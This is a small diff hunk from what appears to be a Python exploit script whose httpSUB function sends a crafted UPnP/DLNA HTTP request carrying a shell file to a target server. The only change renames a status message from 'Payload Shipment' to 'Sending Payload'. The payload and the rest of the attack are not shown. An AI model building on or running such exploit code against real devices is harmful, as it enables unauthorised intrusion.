@@ -17,7 +17,7 @@ def httpSUB(server, port, shell_file):
     request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
 
     sleep(1)
-    print('[*] Payload Shipment')
+    print('[*] Sending Payload')
     con.connect((socket.gethostbyname(server),port))
     con.send(request.encode())
     results = con.recv(4096)
